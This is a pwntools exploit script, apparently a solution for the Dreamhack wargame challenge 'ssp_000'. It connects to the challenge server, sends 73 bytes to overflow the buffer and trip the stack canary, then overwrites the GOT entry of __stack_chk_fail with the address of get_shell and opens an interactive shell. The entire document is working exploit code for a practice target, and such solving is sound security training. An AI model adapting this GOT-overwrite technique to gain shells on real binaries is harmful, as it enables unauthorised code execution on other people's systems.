from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./ssp_000', checksec=False)

#r = process(exe.path)
r = remote('host3.dreamhack.games', 19703)
stack_check_failed = exe.got['__stack_chk_fail']
get_shell = exe.sym['get_shell']
log.info("The address of __stack_chk_fail: " + hex(stack_check_failed))
log.info("The address of get_shell: " + hex(get_shell))

r.send(b'a'*73)
r.sendlineafter(b'Addr : ', str(stack_check_failed).encode())
r.sendlineafter(b'Value : ', str(get_shell).encode())
r.interactive()